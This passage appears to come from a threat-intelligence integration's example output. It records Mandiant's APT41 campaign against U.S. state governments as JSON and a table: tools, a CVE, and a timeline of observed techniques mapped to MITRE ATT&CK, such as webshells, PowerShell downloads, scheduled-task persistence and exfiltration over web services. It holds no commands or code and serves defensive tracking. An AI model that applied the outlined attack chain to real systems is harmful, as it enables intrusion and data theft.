                        "id": "malware--f872b3e0-c277-5716-baae-885a9c410398",
                        "name": "WHOAMI",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--e224f74a-ca0e-540b-884f-03753787316f",
                        "name": "NLTEST",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--2db234c8-596a-58f9-a50f-ce24b58965cd",
                        "name": "IMPACKET.SMBEXEC",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--0c7945de-0968-55e3-ad4e-1600ddfc6b36",
                        "name": "PROCDUMP",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--fed3481f-0095-53f2-8c32-7e286013233b",
                        "name": "DSQUERY",
                        "releasable": true,
                        "type": "malware"
                    }
                ],
                "type": "campaign",
                "vulnerabilities": [
                    {
                        "attribution_scope": "confirmed",
                        "cve_id": "CVE-2021-44207",
                        "id": "vulnerability--362764b4-aa15-55fd-a68b-caf84f25a6b0",
                        "releasable": true,
                        "type": "vulnerability"
                    }
                ]
            },
            "relationships": [
                {
                    "entityA": "CAMP.21.014",
                    "entityAFamily": "Indicator",
                    "entityAType": "Campaign",
                    "entityB": "APT41",
                    "entityBFamily": "Indicator",
                    "entityBType": "Threat Actor",
                    "fields": {},
                    "name": "related-to",
                    "reverseName": "related-to",
                    "type": "IndicatorToIndicator"
                },
                {
                    "entityA": "CAMP.21.014",
                    "entityAFamily": "Indicator",
                    "entityAType": "Campaign",
                    "entityB": "BEACON",
                    "entityBFamily": "Indicator",
                    "entityBType": "Malware",
                    "fields": {},
                    "name": "related-to",
                    "reverseName": "related-to",
                    "type": "IndicatorToIndicator"
                }
            ],
            "type": "Campaign",
            "value": "CAMP.21.014"
        }
    }
}
```

#### Human Readable Output

>### Results
>|fields|rawJSON|relationships|type|value|
>|---|---|---|---|---|
>| actors: APT41<br/>description: In mid-October 2021, Mandiant observed a wave of APT41 activity targeting multiple U.S. state governments. We believe the actors exploited a vulnerability in a public-facing web application, used by numerous state governments and U.S. educational research institutes, to gain initial access. The actors then conducted reconnaissance and credential harvesting activity, dropping multiple files including the publicly available BADPOTATO privilege escalation tool. Mandiant also identified the DEADEYE dropper, which executed a KEYPLUG backdoor.  <br/><br/>This activity is likely a continuation of a previously observed APT41 campaign targeting multiple U.S. state government entities in May 2021. The specific motivation behind the targeting of U.S. state government entities remains unclear, though we infer, based on the targeting profile, that the purpose may include capturing political intelligence or data related to sensitive technologies with national or state-level applications. It is also possible that the capture of credentials can facilitate future targeting or pivoting to targets of interest.<br/>tags: Governments<br/>DBot Score: {"Indicator": null, "Type": "Campaign", "Vendor": "Mandiant", "Score": 0, "Reliability": "A - Completely reliable"}<br/>publications:  | type: campaign<br/>id: campaign--c344bb9b-cb50-58be-9c33-350b622c1fce<br/>name: APT41 Exploition of .NET Web Applications at U.S. State Governments<br/>description: In mid-October 2021, Mandiant observed a wave of APT41 activity targeting multiple U.S. state governments. We believe the actors exploited a vulnerability in a public-facing web application, used by numerous state governments and U.S. educational research institutes, to gain initial access. The actors then conducted reconnaissance and credential harvesting activity, dropping multiple files including the publicly available BADPOTATO privilege escalation tool. Mandiant also identified the DEADEYE dropper, which executed a KEYPLUG backdoor.  <br/><br/>This activity is likely a continuation of a previously observed APT41 campaign targeting multiple U.S. state government entities in May 2021. The specific motivation behind the targeting of U.S. state government entities remains unclear, though we infer, based on the targeting profile, that the purpose may include capturing political intelligence or data related to sensitive technologies with national or state-level applications. It is also possible that the capture of credentials can facilitate future targeting or pivoting to targets of interest.<br/>releasable: true<br/>counts: {"actors": 1, "reports": 4, "malware": 19, "campaigns": 0, "industries": 1, "timeline": 104, "vulnerabilities": 1, "actor_collaborations": 0, "tools": 9}<br/>audience: {'name': 'intel_oper', 'license': 'INTEL_RBI_OPS'},<br/>{'name': 'intel_fusion', 'license': 'INTEL_RBI_FUS'},<br/>{'name': 'tlp_marking', 'license': 'amber'}<br/>profile_updated: 2023-03-06T07:10:13.356Z<br/>campaign_type: Individual<br/>short_name: CAMP.21.014<br/>last_activity_time: 2022-02-26T00:00:00.000Z<br/>timeline: {'name': 'Campaign Created', 'description': 'Mandiant Declared Campaign', 'releasable': True, 'event_type': 'created', 'timestamp': '2021-10-18T00:00:00.000Z'},<br/>{'name': 'First Observed', 'description': 'Mandiant Observed First Activity of Campaign', 'releasable': True, 'event_type': 'first_observed', 'timestamp': '2020-06-15T00:00:00.000Z'},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--ae0d50d8-79de-5193-9223-178fde2c0756', 'name': 'Privilege escalation via access token impersonation', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d', 'name': 'Token Impersonation/Theft', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1134.001', 'tactics': ['Privilege Escalation', 'Defense Evasion']}, {'type': 'attack-pattern', 'id': 'attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48', 'name': 'Access Token Manipulation', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1134', 'tactics': ['Privilege Escalation', 'Defense Evasion']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-05T00:00:00.000Z', 'last_observed': '2021-10-17T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--703b08e4-735b-5c95-9ea9-6568a1589a59', 'name': 'Exploit Operations', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c', 'name': 'Exploit Public-Facing Application', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1190', 'tactics': ['Initial Access']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-06-14T00:00:00.000Z', 'last_observed': '2022-02-26T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--6e210681-2177-52cb-8d79-b9173b8481d6', 'name': 'Arbitrary command execution with PowerShell', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830', 'name': 'Command and Scripting Interpreter', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1059', 'tactics': ['Execution']}, {'type': 'attack-pattern', 'id': 'attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736', 'name': 'PowerShell', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1059.001', 'tactics': ['Execution']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-06-14T00:00:00.000Z', 'last_observed': '2021-06-14T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--93424373-88cb-5563-82d2-03a53fbfecfc', 'name': 'Use of Cabinet (CAB) archive', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-05T00:00:00.000Z', 'last_observed': '2021-05-05T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--7987d235-a174-5e26-a93d-054eee4d5fd1', 'name': 'Arbitrary payload execution using pushd', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-05T00:00:00.000Z', 'last_observed': '2021-05-09T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--1662ed30-9001-56a4-965f-2a15909b0431', 'name': 'Lists directories', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18', 'name': 'File and Directory Discovery', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1083', 'tactics': ['Discovery']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-07-04T00:00:00.000Z', 'last_observed': '2021-07-04T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--16725f7a-f0e8-59fc-8896-2308fc519db1', 'name': 'Domain Account Enumeration', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--72b74d71-8169-42aa-92e0-e7b04b9f5a08', 'name': 'Account Discovery', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1087', 'tactics': ['Discovery']}, {'type': 'attack-pattern', 'id': 'attack-pattern--21875073-b0ee-49e3-9077-1e2a885359af', 'name': 'Domain Account', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1087.002', 'tactics': ['Discovery']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-12-05T00:00:00.000Z', 'last_observed': '2021-12-05T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--b2299938-e0d2-5595-adb5-511669fde717', 'name': 'Persistence via a scheduled task', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9', 'name': 'Scheduled Task', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1053.005', 'tactics': ['Privilege Escalation', 'Persistence', 'Execution']}, {'type': 'attack-pattern', 'id': 'attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9', 'name': 'Scheduled Task/Job', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1053', 'tactics': ['Privilege Escalation', 'Persistence', 'Execution']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-05T00:00:00.000Z', 'last_observed': '2021-05-06T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--50018399-9552-5abd-a955-d9fb5add5471', 'name': 'Host-based Base64 data decoding', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c', 'name': 'Deobfuscate/Decode Files or Information', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1140', 'tactics': ['Defense Evasion']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-23T00:00:00.000Z', 'last_observed': '2021-06-14T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--07cf4702-f617-5e55-a0b5-6b7a3d808eb3', 'name': 'Arbitrary payload execution using msiexec', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--457c7820-d331-465a-915e-42f85500ccc4', 'name': 'System Binary Proxy Execution', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1218', 'tactics': ['Defense Evasion']}, {'type': 'attack-pattern', 'id': 'attack-pattern--365be77f-fc0e-42ee-bac8-4faf806d9336', 'name': 'Msiexec', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1218.007', 'tactics': ['Defense Evasion']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-10-17T00:00:00.000Z', 'last_observed': '2021-12-05T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--38ecb188-e04e-508a-b123-1bf96fe9b4f7', 'name': 'Download using BitsAdmin', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add', 'name': 'Ingress Tool Transfer', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1105', 'tactics': ['Command and Control']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-07-04T00:00:00.000Z', 'last_observed': '2021-07-04T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--926c0c9e-3dfe-54d9-8246-89c2c5315b4b', 'name': 'Exploitation of Microsoft products', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c', 'name': 'Exploit Public-Facing Application', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1190', 'tactics': ['Initial Access']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-02T00:00:00.000Z', 'last_observed': '2021-10-17T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--fddea047-3a39-5ee3-8b46-1d51528ab86c', 'name': 'Datamine operating system and hardware', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1', 'name': 'System Information Discovery', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1082', 'tactics': ['Discovery']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-09T00:00:00.000Z', 'last_observed': '2021-10-17T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--2f9f5b88-f62a-576b-a24c-80d8002bed27', 'name': 'Use of VBScript', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830', 'name': 'Command and Scripting Interpreter', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1059', 'tactics': ['Execution']}, {'type': 'attack-pattern', 'id': 'attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67', 'name': 'Visual Basic', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1059.005', 'tactics': ['Execution']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-09T00:00:00.000Z', 'last_observed': '2021-05-09T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--5f1c1a44-b66d-55ed-a9bc-75aaf336333f', 'name': 'Group enumeration', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--15dbf668-795c-41e6-8219-f0447c0e64ce', 'name': 'Permission Groups Discovery', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1069', 'tactics': ['Discovery']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-12-05T00:00:00.000Z', 'last_observed': '2021-12-05T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--ee6e7904-2082-5c3d-879c-6019bb376261', 'name': 'Moving a file', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-09T00:00:00.000Z', 'last_observed': '2021-05-09T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--8154ff97-5013-5fbe-815f-2b4ae13c734a', 'name': 'Malicious use of HTTP', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161', 'name': 'Web Protocols', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1071.001', 'tactics': ['Command and Control']}, {'type': 'attack-pattern', 'id': 'attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6', 'name': 'Application Layer Protocol', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1071', 'tactics': ['Command and Control']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-02T00:00:00.000Z', 'last_observed': '2021-12-05T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--e10d971b-f104-52c0-82fe-36c2b88ed6e7', 'name': 'Webshell usage', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--d456de47-a16f-4e46-8980-e67478a12dcb', 'name': 'Server Software Component', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1505', 'tactics': ['Persistence']}, {'type': 'attack-pattern', 'id': 'attack-pattern--5d0d3609-d06d-49e1-b9c9-b544e0c618cb', 'name': 'Web Shell', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1505.003', 'tactics': ['Persistence']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-05T00:00:00.000Z', 'last_observed': '2021-05-05T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--77637ab2-8d9f-5791-8c62-e23d6e6b4acf', 'name': 'Download using PowerShell', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add', 'name': 'Ingress Tool Transfer', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1105', 'tactics': ['Command and Control']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-23T00:00:00.000Z', 'last_observed': '2021-05-23T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--57c9f36f-0348-510b-bed6-8564918c43f9', 'name': 'Use of PowerShell', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830', 'name': 'Command and Scripting Interpreter', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1059', 'tactics': ['Execution']}, {'type': 'attack-pattern', 'id': 'attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736', 'name': 'PowerShell', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1059.001', 'tactics': ['Execution']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-23T00:00:00.000Z', 'last_observed': '2021-07-04T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--234d59f5-f5e5-5715-b450-f3762d92dc47', 'name': 'Datamine network connections', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--7e150503-88e7-4861-866b-ff1ac82c4475', 'name': 'System Network Connections Discovery', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1049', 'tactics': ['Discovery']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-09T00:00:00.000Z', 'last_observed': '2021-12-05T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--1a0c3769-c5c9-5d94-8273-f638c4ed72ec', 'name': 'Exfiltration over web service', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--40597f16-0963-4249-bf4c-ac93b7fb9807', 'name': 'Exfiltration Over Web Service', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1567', 'tactics': ['Exfiltration']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-05T00:00:00.000Z', 'last_observed': '2021-05-05T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--b1f68c17-e8fd-5023-be31-d774a1e69e2b', 'name': 'Datamine system users', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104', 'name': 'System Owner/User Discovery', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1033', 'tactics': ['Discovery']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-06-14T00:00:00.000Z', 'last_observed': '2021-12-05T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--36f908a1-261e-5ebc-b1a4-89cf9531cc0d', 'name': 'Arbitrary payload execution using rundll32', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--457c7820-d331-465a-915e-42f85500ccc4', 'name': 'System Binary Proxy Execution', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1218', 'tactics': ['Defense Evasion']}, {'type': 'attack-pattern', 'id': 'attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5', 'name': 'Rundll32', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1218.011', 'tactics': ['Defense Evasion']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-05T00:00:00.000Z', 'last_observed': '2021-06-14T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--46ed8959-571d-58c4-a934-891850964ba8', 'name': 'Remote Staging Directory', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e', 'name': 'Data Staged', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1074', 'tactics': ['Collection']}, {'type': 'attack-pattern', 'id': 'attack-pattern--359b00ad-9425-420b-bba5-6de8d600cbc0', 'name': 'Remote Data Staging', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1074.002', 'tactics': ['Collection']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-05T00:00:00.000Z', 'last_observed': '2021-05-05T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--9c7f710b-4596-57d9-b705-f7d30cb27299', 'name': 'Use of webshell', 'attribution_scope': 'confirmed', 'releasable': True}, 